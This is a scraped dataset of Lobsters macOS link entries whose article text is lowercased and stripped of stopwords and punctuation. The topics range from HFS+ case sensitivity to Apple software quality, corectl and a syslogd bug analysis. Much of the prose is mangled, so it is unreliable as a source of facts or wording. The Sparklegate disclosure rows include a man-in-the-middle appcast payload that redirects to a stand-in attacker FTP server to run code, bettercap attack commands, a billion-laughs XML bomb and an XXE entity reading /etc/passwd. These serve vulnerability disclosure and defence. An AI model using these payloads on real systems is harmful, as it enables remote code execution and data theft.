usersby default privacy reason extension disabled incognito mode want go window extension check allow incognito box next extensionthe enddid miss anything useful chrome profile incognito mode let know
609,Lobsters,mac,Apple macOS,The dangers of HFS+ for git repositories,http://vhf.github.io/blog/2016/02/04/the-dangers-of-hfs-for-git-repositories/,danger hf git repository,,hf case sensitive took month realize basic fact one thing never bother researching consider buying mac last week hit hard spent minute trying fix something fixed second colleague created fileext website hosted github page printed urlfileext important document supposed hand someone without access either internet printer asked fix easy pie except mkdir gittest cd gittest git init touch file l file git add file git commit add file mv file file l file git add file git status branch master nothing commit working directory clean oops point lost quite trying different idea could believe hf case insensitive never even occurred thought git playing trick ended following git rm file git add file git commit rename file problem fixed investigated bit touch l echo b cat b get confirmation internet course developer already knew nt currently repository dedicated folder repository imagine one file file directory cloned finally prevent future headache du ch repository grep total total hdiutil create type sparse f casesensitive journaled hf size volumereposdmg created volumereposdmgsparseimage decided mounting point volume added alias mount rc file created symlink repository mountpointrepo moved repos volume mv repository backuprepositories echo alias mountrepos hdiutil attach volumereposdmgsparseimage mountpoint usersvictormountpointrepo zshrc source zshrc mountrepos ln usersusermountpointrepo repository cp r backuprepositories backuprepositories repository touch repositoriesa repositoriesa l repository perfect sparse volume grow without intervention fit repository content jetbrains ides started complaining though filesystem casesensitivity mismatch project seems located casesensitive file system match ide setting controlled property ideacasesensitivefs even doc subject poor found following solution echo ideacasesensitivefstrue feel safer though really understand case insensitive file system still exist probably people like buy mac know
610,Lobsters,mac,Apple macOS,Apple’s apps need work,http://www.theverge.com/2016/2/3/10900612/walt-mossberg-apple-iphone-ios-mac-osx-app-problems,apple apps need work,best smartphone market overall work itunes desktop made better mail billion people photo much faster cleaner icloud,people think apple maker excellent premium hardware fact many reviewer regard apple device best buy instance record saying important product iphone best smartphone market verge overallbut metal glass silicon product apple builtin software huge part experience since company introduced first mac whether operating system core apps major aspect make user reviewer value apple product software meld power reliability ease use work favorite steve job phrasein last couple year however noticed gradual degradation quality reliability apple core apps mobile io operating system mac o x platform almost tech giant taken eye ball come core software product pursues big new dream like smartwatches carslet clear time scenario find core apple apps work well enough sometimes delightfully well otherwise recommend hardware love imessage new note apple pay touch id safari airplay though core apps made competitor generally fabulousbut exception increasing hold apple higher oftenproclaimed standard based work claim oftrepeated contention mr job successor tim cook apple business make great product apple advantage design build software together software nt excellent superlative hardware disservice welcome mossberg weekly commentary review column verge recode veteran tech journalist walt mossberg executive editor verge editor large recode response inquiry apple said dedicated software team across multiple platform effort strong ever company explains team work every major core app year hardware year see major revamps apps others apple apps often fail meet selfimposed standard apple course famous software misfire like mobileme itunes ping cloud service first iteration apple map gotten vastly better far apple news nothing write home view talking familiar mainstay like mail photo itunes icloud way big sometimes small nagging think often fail meet apple selfimposed standard sometimes io sometimes o x sometimes example itunes desktop apple itunes program envy world combined digital music store player could also sync ipod worked mac window reasonably fast surefooted dread opening thing despite big overhaul made better itunes bloated complex sluggish gotten even worse since recent integration new apple music streaming service day tried sync two ipads rare event took forever program recognize three mac built itunes slow almost every task time disassemble thing way apple done io itunes store content type music video podcasts playback app company concedes debated question far come side keeping huge program one piece working make faster wring bug occur mail apple desktop mobile mail apps superb despite nice feature addition find become slow unreliable especially true use gmail billion people experience platform mail slow receiving sending gmail message whether personal business account message show search miss thing problem go beyond gmail like many others know rely gmail forced switch least add google gmail app website apple claim issue beyond control control email app vendor gmail us nonstandard technology give speed advantage search giant apps site google told otherwise past problem go beyond gmail find lot io new o x email apps try help quick message triage intelligently autosort various type email apple ventured territory beyond enabling swiping action dealing message even junk mail filter far superior competitor failing regularly day mobile version mail still send mail contact group make apple contact app company say deliberate group iphone meant use mail photo photo got big upgrade mac last year apple finally retired aging creaky iphoto replaced app called photo new app much faster cleaner experience mac accompanying optional service called icloud photo library store image cloud tarnish improved experience work quickly accurately iphone ipads slow balky desktop one people picture still take forever mac find older photo show blank thumbnail apple quality worse apple brilliant builtin photo feature shared icloud library personal private social network built around related photo always sync properly io mac company say common occurrence icloud still lot work done cloud brings may apple annoying consequential software weakness cloud software thing apple ecosystem like contact imessages sync great experience addition photo example find music apple streaming music sometimes wrong album art fetched icloud safari bookmark sync intermittently across apple device unlike amazon kindle app apple product company ibooks remember left unless set bookmark trying edit collaboratively comment cloud version apple page word processor much harder google doc lately even cloud backup io failed ipads one able back cloud five week sync itunes company proud ability make thing work across device continuity handoff feature let answer voice call mac continue task started desktop phone attribute least complaint like ipad backup issue bug particular setup maybe larger pattern cloud issue besides supposed work none thing insurmountable perhaps apple right bug get quashed observing due setup convinced something broader going lot small software disappointment aggravation adding gradually time putting sterling experience using apple hardware risk
611,Lobsters,mac,Apple macOS,Plain Email – An app concept for efficient one-touch email processing workflow,http://www.plainemail.com,plain email app concept efficient onetouch email processing workflow,,done process message mark done message get archived found later delegate delegate message someone appropriate process defer ca nt deal message right away book time calendar respond respond message immediately archive
612,Lobsters,mac,Apple macOS,Apologies! Sky Kinda Falling + Protecting Yourself From Sparklegate,https://www.taoeffect.com/blog/2016/02/apologies-sky-kinda-falling-protecting-yourself-from-sparklegate/,apology sky kinda falling protecting sparklegate,followup yesterday post sky falling sparklegate bad could missed radek insisted even firefox running manually set finder default ftp handler however never run firefox account pay attention even used firefox fundamental flaw o x sparkle finder webview sparkle download firefox necessary run account bug use duti command duti previous post homebrew use little snitch similar disable lan finder connection little snitch configuration rule finder deny finally make sure gatekeeper enabled system preference security privacy conclusion radek simone margaritelli making simple use exploit apple told aware problem hope able fix asap espionage,followup yesterday post sky falling sparklegate bad could trying failing reproduce sparklegate arrived conclusion gatekeeper quarantine fact protect o x user remote code execution rce attack missed radek discoverer vulnerability insisted mistaken gatekeeper really get bypassed today attempted reproduce attack using fresh account different machine turn ever opened firefox vulnerable ftp version attack even firefox running manually set finder default ftp handler resetting protocol handler via duti comapplefinder ftp effect reason firefox still launch response attack ftp handler magically reset back firefox however never run firefox account vulnerable pay attention even used firefox protect sparklegate sparklegate fundamental flaw o x sparkle flaw finder foremost webview second almost certainly several apps vulnerable attack even every app update sparkle framework still might others vulnerable way protect getting owned recommend download firefox necessary run every account firefox user saved bug hope never get fixed use duti command duti utility mentioned previous post prevent attack changing default app handle protocol necessary install homebrew terminal window run command brew install duti duti orgmozillafirefox ftp duti comapplesafari afp duti comapplesafari smb firefox installed need change orgmozillafirefox comapplesafari like others recommend firefox unlike safari automount anything great browser right case protocol could used attack may also want use little snitch similar disable lan finder connection open little snitch configuration make sure looking rule use search field search finder delete rule appear search result next clear search field scroll top uncheck rule allow process make outgoing connection local network click disable anyway prompted mean get prompted frequently prompt happen example itunes try sync iphone wifi try access network volume reason generally want allow unless mention something ftp smb afp trying access network volume something like might appear attacked via ftp necessarily prompt watch click deny instance prevent attack greeted error like finally make sure gatekeeper enabled gatekeeper protect user done least one thing provide additional protection case afp smb protocol used open system preference go security privacy make sure allow apps downloaded set anywhere must open unsigned app gatekeeper recommended unless know rightclick app choose open contextual menu conclusion devastating vulnerability affect many o x user since webview finder fault attack go beyond apps updated sparkle framework apple fix problem protect least one three thing mentioned preferably thanks radek insisting missed something discovering vulnerability thanks also simone margaritelli making simple use exploit without would hardpressed learn defend apple told aware problem hope able fix asap follow espionage twitter
613,Lobsters,mac,Apple macOS,Sky Not Falling: Sparklegate Not As Bad As It Could Be,https://www.taoeffect.com/blog/2016/01/sky-not-falling-sparklegate-not-as-bad-as-it-could-be/,sky falling sparklegate bad could,update february vulnerable attack read followup post sparklegate sparkle first report second post terminal proofofconcept exploit espionage reproduce mostly bettercap osxsparklerb binls check update ftp duti comapplefinder comapplesafari quarantine gatekeeper conclusion precautionary step mitigate original report mitigate developer later version require free user firefox bug homebrew protocol smb little snitch block please fix whole visitingawebpageautomounting autolaunching thing espionage,update february turn user vulnerable attack read followup post sparklegate term coined recent discovery allegedly every o x machine vulnerable rce remotecodeexecution attack widely used sparkle framework along o x standard webview component allow webpage mount ftp volume run arbitrary program computer first report insane vulnerability restricted use terminal setting file achieve feat shortly followed second post time alleging executable could run without need intermediate step terminal file second post also came proofofconcept exploit anyone use attack people fix suggested original post app developer serve update feed http update latest version sparkle case enough espionage already check update http therefore particularly affected issue still remote chance someone could obtain legitimateyetfraudulent http certificate conduct attack also idea attack even possible suggests severe failing apple part one affect apps use sparkle app webview every o x user least several apps decided look attempt reproduce attack found reproduce mostly ran simone margaritelli bettercap osxsparklerb module tried reproduce alleged scenario attackbyterminalsettings attackbyarbitraryexecutable attackbyarbitraryexecutable tried binls sudo bettercap l x nospoofing nodiscovery proxy proxymodule osxsparklerb sparklercefile binls order mitm locally must also set systemwide http proxy setting lan ip port shown output bettercap proceeded check update vlc indeed flurry activity something unexpected happened instead shown terminal window output l taken firefox web page directory listing well threatening realized apparently immediately without going seemingly immune attack firefox somehow default handler ftp url ok thought happens remove firefox handler digging discovered handy tool called duti available via homebrew setting handler comapplefinder work setting comapplesafari happened tried safari default ftp handler excellent would expect quarantine prevents file automatically executing although bit disturbing safari chooses automount ftp volume instead handling protocol like firefox still rce maybe terminal setting file bypass quarantine gatekeeper original post alleges sudo bettercap l x nospoofing nodiscovery proxy proxymodule osxsparklerb sparklercefile settingsterminal nope blocked gatekeeper conclusion precautionary step mitigate least attempt reproduce vulnerability seems quarantine gatekeeper together prevent signed unsigned application automatically run without user consent clear still problem several reason random webpage load mean safari finder automounts autolaunches anything crazy thank goodness gatekeeper quarantine without would total complete longlasting catastrophe make sure disabled either original report indicates attack could still used exhaust system memory way xml handled broken apps check update http updated latest version sparkle still vulnerable mitigate developer update apps take care make sure using least sparkle preferably later version later version released would recommend cautious building sparkle framework source makefile make easy know crazy surprise like lurking undiscovered make sure appcast using http addition sparkle builtin dsa signature verification sparkle require http dsa check http cert free excuse user simply download install run firefox feature bug p certain firefox default handler ftp use homebrew brew install duti duti orgmozillafirefox ftp however protocol besides ftp could used like smb even better would install little snitch make sure permanent rule allowing finder make outgoing connection thus get prompt asking allow finder connect something anything initiate block still release minor update espionage updated sparkle extra safe good news though long gatekeeper quarantine setting modified sparklegate harm long blindly click yes thing user still take precautionary step like little snitch protect even worst case gatekeeper quarantine fail finally request apple please fix whole visitingawebpageautomounting autolaunching thing opened rdar follow espionage twitter
614,Lobsters,mac,Apple macOS,There's a lot of vulnerable OS X applications out there.,https://vulnsec.com/2016/osx-apps-vulnerabilities/,lot vulnerable o x application,update update two different newest version sparkle updater already available address described vulnerability application affected sparkle updater sparkle updater documentation appcast describes detail process mitm attack mitm sequelpro abusing webkit webview component email protected gatekeeper remote code execution abusing xml format xml external entity xxe processing billion laugh billion laugh xxe xxe outofband data retrieval fix video solution http sparkleprojectorg thought reporting bug origami facebook mitre cve sequel pro abhi sparkle updater kornel please update application,lately research connected different updating strategy tested application working mac o x short weekend research revealed many insecure application wild result found vulnerability allows attacker take control another computer network via mitm tested o x yosemite el capitan latest version software though work previous version vulnerability code signing exists due functionality provided webkit view allows javascript execution ability modify unencrypted http traffic xml response update mentioned vulnerability present updater built o x present previous version sparkle updater framework part apple mac o x furthermore confirm pixelmator vulnerable discontinued use sparkle framework update two different vulnerability first one connected default configuration http unsafe lead rce mitm attack inside untrusted environment second one risk parsing file ftp protocol inside webview component result security flaw server allows replacing xml file target people affected application possible even without knowing private dsa key without modifying application binary server http nt require mitm attack anymore newest version sparkle updater already available address described vulnerability application affected short application use sparkle updater framework connecting http instead secure http connection vulnerable since sparkle throw error case invalid ssl certificate default help protect mitm attack used wisely list application using sparkle updater framework huge since widely used updating framework available o x developer example application using sparkle updater vulnerable sparkle updater sparkle updater framework nature safe easy use developer include sparkle project broke one simple rule set http everywhere sparkle updater documentation note strongly encourage use http url appcast since downloading application binary http using dsa signature validation quite common application still tricky part called appcast appcast r feed host information software update available version release note first url application asks update process start appcast url using unencrypted http protocol appcast modify binary fly without key required signing application package using tool like bdfproxy going work changing binary replacing different one going break dsa signature validation process sparkle updater return error modify binary file update dsa signature sound like impossible mission really let take look appcast feature every time want release new version application need publish change appcast like r channel official documentation sparkle updater project describes detail process appcast request response using xml data exchange update notification message pure html code displayed inside webview component short mean access html javascript enough harm end user description entity hold entire update message user item title version bug fixed new feature title description cdata new feature description item mitm attack man middle mitm attack third party secretly intercept traffic two party eg user server provides opportunity capture modify un encrypted traffic user let sum everything point appcast process using http could intercepted modified fly insert html javascript code webview component display user control transmission mitm attack information go start attack sequelpro chosen random let visualize actual network topology control unencrypted traffic bob machine setting one attack inside lan like fake wifi access point sniffingspoofing part ready spoof dns probe appcast server send malformed response xml version encoding r xmlns atom http xmlns sparkle http wwwandymatuschakorgxmlnamespacessparkle version channel title sequel pro title link http wwwsequelprocom link description appcast sequel pro description language en language item title sequel pro title description cdata modified message p mean b mitm b attack working p description pubdate thu jan gmt pubdate enclosure url http length type applicationoctetstream sparkle dsasignature sparkle version sparkle shortversionstring item channel r remember bumpup app version sparkle version xml response without sequelpro going display update reminder confirmed html code get executed test javascript example description cdata script type textjavascript windowlocation http wwwgooglecom script description checking update inside sequelpro app google website appears web browser mean builtin webview component executes javascript code sum running mitm attack control javascript code executed client side open user browser redirect malicious website check however malicious site capable finding exploit specific browser exploitable redirecting user malicious website let abuse webview component abusing webkit webview component part tricky tested many different solution exploit webview component failed many time matt gave hint article x rce atlassian hipchat missing piece puzzle executing external application right webview component exploit issue need set ftp server ourfakeservercom host malicious code run http server act appcast server redirect user traffic wwwsequelprocom original ip address fake http server ready need replace previous javascript snippet modified code description cdata style color red remote code execution script type textjavascript windowlocation ftp anonymous email protected windowsettimeout function windowlocation file volumesourfakeservercomupgradeterminal script description upgradeterminal file exported setting profile terminal app terminal preference profile inside shell tab selected profile possibility add startup command execute immediately loading profile upgradeterminal file ready set everything needed start attack remember user need check update manually application check periodically mean wait appropriate update request app exploit simple trick worked opening external resource like ftp smb afp o x mounting automatically volume path know path resource directory name server name result full path volumesourfakeservercom opened app terminal extension script o x looking signaturecertificate validating app downloaded internet basically skip gatekeeper validation vulnerability result remote code execution abusing xml format also additional attack could easily performed using discovered vulnerability since communication based xml format test xml external entity xxe processing attack well billion laugh attack billion laugh furthermore enforce application allocate much memory resource xml version encoding doctype lolz entity lol lol element lolz pcdata entity lol lol lol lol lol lol lol lol lol lol entity entity entity entity entity entity entity entity lolz lolz running described attack using presented xml file see sequel app allocating memory mean example worked well xxe also possible insert content update message file located disk far sequelpro access xml version encoding doctype foo element foo entity xxe system file etcpasswd r xmlns atom http xmlns sparkle http wwwandymatuschakorgxmlnamespacessparkle version channel title sequel pro title link http wwwsequelprocom link description appcast sequel pro description language en language item title sequel pro title description xxe description pubdate thu jan gmt pubdate enclosure url http length type applicationoctetstream sparkle dsasignature sparkle version sparkle shortversionstring item channel r xxe outofband data retrieval interesting thing xxe vulnerability system entity available could read file directly remote system entity simplest test xxe oob attack xml version encoding doctype foo entity xxe system http case working appropriate fix implemented sparkle framework sparkle updater free xxe oob attack video video solution curious application running computer affected implementing sparkle updater without http prefix run wireshark check fix avoid rce app need edit infoplist file replace http http sufeedurl key remember check server configuration support http valid ssl certificate place fully protect issue need upgrade sparkle updater framework version http sparkleprojectorg already patched thought reporting bug origami facebook talking zac fixed immediately day great communication great process glad responsible people working mitre cve requested cve nt get response week already even ignored sparkle updater maintainer sequel pro jumped conversation right away talked issue glad abhi maintaining project cool guy extensive knowledge programming p nice thing coming future release sequel pro wait sparkle updater passionates work project first patch prepared day excellent understanding issue big thanks kornel please update application
615,Lobsters,mac,Apple macOS,"Source code to classic Macintosh game series ""Glider"" released",https://github.com/softdorothy,source code classic macintosh game series glider released,highlight create github profile sign popular repository contribution last year contribution activity january august reload reload,highlight arctic code vault contributor dismiss create github profile sign profile github best place host code manage project build software alongside million developer sign popular repository source macintosh game glider pro written john calhoun published casady green inc r original source glider john calhoun originally published casady green inc r source pararena commercial macintosh game john calhoun published casady greene inc r source shareware game macintosh written john calhoun r contribution last year sep oct nov dec jan feb mar apr may jun jul aug sun mon tue wed thu fri sat contribution activity january august softdorothy activity yet period perform action time signed another tab window reload refresh session signed another tab window reload refresh session
616,Lobsters,mac,Apple macOS,"Apple recalls some AC adapters, world travel kits in parts of South America, Europe, Asia, and Oceania",http://appleinsider.com/articles/16/01/28/apple-recalls-some-ac-adapters-world-travel-kits-in-parts-of-south-america-europe-asia-and-oceania,apple recall ac adapter world travel kit part south america europe asia oceania,recalled,apple thursday issued recall twopronged ac wall plug adapter designed argentina australia brazil continental europe new zealand south korea potential risk electric shock apple said aware incident around world twopronged ac wall plug adapter broke resulted electrical shock user touched recall includes many twopronged wall plug shipped mac io device determine wall plug affected recall check inside slot attache main apple power adapter affected wall plug either four character five character character printed inside slot apple first recall since august recalled number thirdgeneration apple tv unit defective part
617,Lobsters,mac,Apple macOS,Hypercard (1987),https://www.youtube.com/watch?v=EMFscTOazS0,hypercard,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature
618,Lobsters,mac,Apple macOS,simulated Model M noises for OSX,https://github.com/millerjs/modelm,simulated model noise osx,modelm mechanical keyboard audio simulator rust ibm model keyboard feature stereo sound custom resource loading requirement osx debianubuntu arch installation running precompiled binary download latest release installation source rust cargo usage note linux usage help output example config file option credit ibm sound hhkb pro topre,modelm mechanical keyboard audio simulator keyboard written rust get clickityclacking inspired ibm model keyboard disproportionate love clicky keyboard non clicky keyboard simple program simulate model providing audible keystroke feedback feature provide audible feedback keystroke modelm hook osx quartz event osx devinput keyboard device must run root terminal accessibility feature enabled osx stereo sound key left sound like key left key right sound like key right custom resource loading pick favorite clickityclacks point modelm directory sound bite config file requirement install openal audio dependency osx brew update brew install openalsoft libsndfile debianubuntu aptget update aptget install libopenaldev arch may also need pulseaudio shown pacman openal libsndfile pulseaudioalsa installation running precompiled binary run compiled binary download latest release simply run following within extracted tarball modelm resourcesmodelm installation source first install rust cargo git clone http githubcommillerjsmodelmgit cd modelm cargo run release usage specify custom clickity clack sudo modelm pathtoclacks make key gradient left right dramatic sudo modelm x le dramatic sudo modelm x reverse headphone backward silly sudo modelm note linux usage currently modelm default reading specify event device read runtimefrom setting modelminputdevice environment variable new path help output modelm joshua miller jsmiller uchicagoedu turn computer mechanical keyboard emulator usage modelm flag option flag v debug debug output h help print help information version print version information option c config config specify config parse click option directory dir specify directory load click sound v volume volume adjust keyboard volume range x xscale xscale specify pan amount positional sound click decimal default larger value apart click sound value turn positional sound value revers directionality example config file switch enter keycoderegex keydownpaths keyuppaths key keycoderegex keydownpaths keyuppaths option pas option cargo eg change volume sudo cargo run release v credit currently ship ibm sound hhkb pro topre sound
619,Lobsters,mac,Apple macOS,"Search Google, GitHub, Stack Overflow, and other sites from the terminal",https://github.com/zquestz/s,search google github stack overflow site terminal,install gvt example providertag expansion providertag autocompletion fish fish advanced server mode http jumpsio configuration http githubcomvstakhovlibucl supported provider contributor license,web search terminal open browser usage query flag flag b binary string binary launch search uri c cert string path certpem tl k key string path keypem tl l listproviders list supported provider listtags list available tag output output mode port int server port default p provider string search provider default google server launch web server tag string search tag v verbose verbose mode version display version install go get v githubcomzquestzs cd gopathsrcgithubcomzquestzs make make install issue building vendor dependency using gvt go get u githubcomfilosottilegvt cd gopathsrcgithubcomzquestzs gvt restore alternatively use homebrew brew install ssearch example search puppy google puppy search wifi router amazon p amazon wifi router search rhino wikipedia p wikipedia rhino search provider tagged video muppets video muppets providertag expansion partial matching provider tag name search facebook hamster p fa hamster toaster amazon p toaster search technews tagged provider ssd info te ssd shopping site blanket sh blanket providertag autocompletion autocompletion supported provider tag set autocompletion installed add following line bashprofile zshrc f gopathsrcgithubcomzquestzsautocompletescompletionbash gopathsrcgithubcomzquestzsautocompletescompletionbash fi good go p ba tab tab baidu bandcamp fish alternatively use fish following work mkdir p configfishcompletions ln gopathsrcgithubcomzquestzsautocompletesfish configfishcompletionssfish advanced setup alias profile favorite provider alias sa p amazon alias sw p wikipedia use find cat instead default browser b cat search conspiracy theory incognito mode b chromium incognito conspiracy theory b firefox privatewindow conspiracy theory search specific subreddit p reddit rcscareerquestions best startup server mode web interface also provided pas flag start server port default start server tl port c pathtocertpem k pathtokeypem port feel free try http jumpsio configuration setup default configuration create configsconfig configuration file ucl format json also fully supported ucl parse json file information ucl visit http githubcomvstakhovlibucl following key supported blacklist array provider exclude binary binary launch search uri cert path certpem tl customproviders array custom provider key path keypem tl output output mode port server port provider search provider tag search tag verbose verbose mode whitelist array provider include set default provider duckduckgo provider duckduckgo search provider whitelist google amazon wikipedia exclude provider nt need blacklist dumpert add custom provider customproviders name example url http examplecom q tag example custom provider require thing alphanumeric name token query string valid url scheme supported provider aliexpress allocine amazon archpkg archwiki arstechnica arxiv atmospherejs aur baidu bandcamp bgr bigbasket bing buzzfeed cnn codepen coursera cplusplus cppreference crate crunchyroll debianpkg dict digg diigo dockerhub dribbble duckduckgo dumpert engadget explainshell facebook flickr flipkart foursquare giphy gist github gmail go godoc goodreads google googledocs googleplus hackernews ietf ifttt imdb imgur inbox instagram kickasstorrents libgen linkedin lmgtfy macports mdn medium metacpan msdn naver netflix nhaccuatui npm npmsearch npr nvd overstock packagist phandroid php pinterest postgresql python quora qwant reddit regex rottentomatoes rubygems shodan soundcloud spotify stackoverflow steam taobao thepiratebay theregister torrentz twitchtv twitter upcloud vimeo wikipedia wolframalpha yahoo yandex youtube zhihu contributor license released mit license
620,Lobsters,mac,Apple macOS,Reversing Apple's syslogd bug,https://reverse.put.as/2016/01/22/reversing-apples-syslogd-bug/,reversing apple syslogd bug,iokit syslog syslogd source code bindiff diaphora diaphora syslogd usrsbinsyslogd yosemite binary diaphora diaphora addlockdownsession realloc failedn syslogdtprojdbserverc reallocf fd lockdownsessionfds reallocf allocating memory number lockdown session instead enough memory session addlockdownsession systemlibrarylaunchdaemonscomapplesyslogdplist default configuration o x vulnerable remoteacceptmsgtcp ifdef remoteinit remoteinittcp remoteinittcp remoteacceptmsgtcp grand central dispatch remoteinit initmodules syslogd remoteenable remote feature disabled default initmodules main config iphone remote syslogd systemlibrarylaunchddaemonscomapplesyslogdplist plutil convert filename programarguments socket launchd syslogd define aslremoteport watch addlockdownsession watch watchlockdownstart sessionflagslockdown sessionflagslockdown syslogd remoteacceptmsg code path trigger bug o x syslogd watch syslogd fd nothing really interesting vulnerability o x p understand http wwwscitoolscom,two day ago el capitan released together security update yosemite maverick bulletin available describes nine security issue related kernel iokit driver last security issue memory corruption issue syslog could lead arbitratry code execution root privilege quite curious bug mostly involved syslogd logging daemon post reversing vulnerability finding could exploited unfortunately u apple terse security update example say nothing exploitable default o x installation requires particular condition see later bug exploitable default o x installation apple make available source code many component used o x time significant delay need use binary diffing find difference vulnerable updated binary usual tool purpose bindiff also free alternative called diaphora made joxean koret tool require ida post going use diaphora purpose need copy vulnerable patched binary easiest way copy syslogd binary found usrsbinsyslogd update installed usually good idea virtual machine snapshot version extract new binary update package el capitan yosemite maverick post focus yosemite binary diaphora essentially work generating database comparing content comparing syslogd binary get u following warning diaphora mean binary similar expect minimal change two one change detected output change quite subtle original code could something like reallocf pointer value patch something like reallocf pointer value syslogd source package el capitan downloaded easiest way try locate function grep code using string addlockdownsession realloc failedn finding single hit inside syslogdtprojdbserverc source code function make easier observe vulnerability patch made reallocf allocation size vulnerability triggered fd variable written lockdownsessionfds array allocation size used reallocf wrong since allocating memory number lockdown session instead enough memory session following image taken analysis perfect illustration overflow heap corruption third connection heap corruption happening test connection required make crash get time crash different area zimperium also testing o x developer particular piece code made mistake fix simple adding set parenthesis c language powerful unforgiving small mistake point know vulnerability patched next question reach function following partial call graph addlockdownsession judging initial function name vulnerable function could reached either locally unix socket remotelylocally via tcp socket security bulletin mention attack local user looking systemlibrarylaunchdaemonscomapplesyslogdplist configuration observe syslog unix socket mean default configuration o x vulnerable unless user change unfortunately u apple mention bulletin indeed interesting information example anyone running old system upgraded dig bit deeper understand need activate feature o x try reproduce vulnerability remoteacceptmsgtcp function seems like good candidate trace back looking source code find interesting function function activate remote feature allows u reach vulnerable code ifdef mean check binary see compiled final binary disassembly output remoteinit show remoteinittcp compiled meaning reach vulnerable code via tcp socket either locally remote depending user configuration remoteinittcp function take care creating binding listener socket one calling remoteacceptmsgtcp saw first callgraph using grand central dispatch still know activate remote feature next step see call remoteinit two call interesting initmodules remote module support compiled syslogd binary target io simulator default enable disable status depends remoteenable local variable default value zero meaning remote feature disabled default another strong clue default o x vulnerable finally initmodules called main find final clue activate feature inside main observe interesting thing finally sure o x vulnerable default installation first thing observe code snippet remote feature enabled default embedded o usually meaning io appletv next option config also enables iphone option selected last undocumented remote command line option enable remote feature apple operating system activate feature need edit syslogd launchd configuration file found systemlibrarylaunchddaemonscomapplesyslogdplist usually binary format converted using plutil convert filename programarguments socket key need modified following launchd control socket also need configure socket syslogd listening remote option define aslremoteport modify plist reload syslogd finally connect port vulnerable code path triggered using watch command attach debugger insert breakpoint vulnerable addlockdownsession breakpoint never hit select watch command code inside session call vulnerable function watchlockdownstart set one place inside session sessionflagslockdown flag passed session argument finally observe conclude security bulletin talk local user mean sessionflagslockdown flag set local connection never remote tcp connection feature enabled o x syslogd binary function call remoteacceptmsg show clearly conclusion code path trigger bug o x even user configures remote feature test bug observe action way attach syslogd binary patch remove condition also patch inside session easier next need small tcp client sends connection port issue watch command sooner later syslogd binary finally crash vulnerability also seem easy exploit much control fd variable overwriting allocated array one final note vulnerability patched el capitan included yosemite maverick security update seen even el capitan code path vulnerable code weird older version also patched apple security policy still confusing time long post finally conclude nothing really interesting vulnerability o x also io given potential barrier exploitation interesting reverse engineering source code analysis exercise understand vulnerability impact o x exercise needed apple published relevant detail security bulletin thanks pmsac draft post review exploitation discussion also qwertyoruiop poupas fun fg p tool used generate call graph understand http wwwscitoolscom great tool browsing auditing large project
621,Lobsters,mac,Apple macOS,Mac Debugger,https://github.com/blankwall/MacDBG,mac debugger,mac debugger getting started plugins usage running test debugger test program,mac debugger mac debugger created focus giving programmer powerful framework programatically create script debug program mac osx found product platform core macdbg written c kept minimal possible provide enough basic interaction kernel userland create powerful feature higher level functionality left python implementation stack tracing dissasembly watchpoints thread state wrapper class provided programmer create scripting program note alpha implementation showing concept idea fully refined expect beta version coming month refined variable naming cleaner code useable example thanks interest suggestion comment help welcome getting started git clone http githubcomblankwallmacdbggit navigate macdbg directory cd src make shared library libmcdbdylib compiled several binary plugins usage running test debugger test program cd pythonexamples open another terminal run sudo basicexamplepy test rogram attach set breakpoints hit f fork program enter continue press c crash see breakpoint output like seen many example example directory least small description available nore description usage coming soon example spawn program nearly take pid attach please note written specifaclly specific program mallocpy written track mallocs firefox change would need made make work program
622,Lobsters,mac,Apple macOS,How I set up a new Mac using Emacs and literate programming,https://gist.github.com/stig/c792dc50db17e8ac253d,set new mac using emacs literate programming,set new mac install apps appstore source emacs fish csshx etc story configure system preference terminal system preference keyboard input source date time reload reload,instantly share code note snippet setup new machine set new mac install apps first install apps try use appstore everything buth unfortunately possible ymmv appstore slack tweetbot copyclip xcode fantastical source emacs fish csshx etc precious story configure system preference installs running update preference try manage change default possible make life simpler terminal mark novel default profile default write comappleterminal default window setting novel default write comappleterminal startup window setting novel text tab set default text size set font menlo shell tab change shell exit dropdown close shell exited cleanly keyboard tab tick use option meta key system preference keyboard shortcut tab change press tab move keyboard focus control mission control turn shortcut move left space move right space input source tick show input menu menu bar add dvorak input source date time date time tab use timeeuroapplecom clock tab tick show day week perform action time signed another tab window reload refresh session signed another tab window reload refresh session
623,Lobsters,mac,Apple macOS,corectl - CoreOS over OS X made very simple,https://github.com/TheNewNormal/corectl,corectl coreos o x made simple,coreos macos made simple must homebrew crash xhyve allows traffic fromto interface host step step instruction install corectl installing release build prefered end user downloading github release build locally power user start corectl server daemon corectld required corectl kickstart coreos vm usage corectld corectl simple usage recipe docker rkt playground create volume store persistent data corectl must raw label start docker rkt playground cloudconfig fun tracing hyperkit project using corectl rima mocevicius corectl genevera acknowledgement contributing corectl open source apache license version,coreos macos made simple read first must running macos yosemite later later macintosh ie one cpu support ept everything work starting bundled qcowtool helper runtime dependency libev sort build statically need make available local system using homebrew easy brew install libev still using version virtualbox older corectl crash system either virtualbox running run previously last reboot see xhyve issue full context reason unable update virtualbox latest either stream using current session please make sure restart mac attempting run corectl using sort desktop firewall macos host eset little snitch whatever please make sure allows traffic fromto interface host otherwise vm ever able succefully boot ca nt fetch ignition configs etc host running corectld step step instruction install corectl installing release build prefered end user brew install corectl downloading github go release page download tarball binary system unpack content placing somewhere directory path usrlocalbin usually good choice build locally power user mkdir p gopath srcgithubcomgenevera cd gopath srcgithubcomgenevera git clone git githubcom geneveracorectlgit cd corectl make built binary appear inside gopath srcgithubcomgeneveracorectlbin start corectl server daemon corectld required step starting corectl release usrlocalbincorectld kickstart coreos vm following command fetch latest coreos alpha image available already available locally verify integrity boot corectl run terminal shortly see something like following corectl run started successfully address pid boot log found console found accessing newly created coreos instance click away corectl ssh usage straight online help corectld coreos macos made simple http githubcomgeneveracorectl copyright c antónio meireles usage corectld flag corectld command available command start start corectld status show corectld status stop stop corectld version show version information flag debug add additional verbosity option directed debugging purpose power user use corectld command help information command flag also set via uppercase environment variable prefixed coreos example debug coreosdebug corectl coreos macos made simple http githubcomgeneveracorectl copyright c antónio meireles usage corectl flag corectl command available command kill halt one running coreos instance load load coreos instance defined instrumentation file l list coreos image available locally p list running coreos instance pull pull coreos image upstream put copy file inside vm query display information running coreos instance rm remove coreos image local filesystem run boot new coreos instance ssh attach run command inside running coreos instance version show version information flag debug add additional verbosity option directed debugging purpose power user use corectl command help information command flag also set via uppercase environment variable prefixed coreos example debug coreosdebug find full autogenerated documentation simple usage recipe docker rkt playground create volume store persistent data qcowtool use shipped together corectl creates image please note size argument must suffixed right way kibmibgibtibpib qcowtool create become varlib dockerrkt example case created volume quick note regarding raw volume raw volume default version still 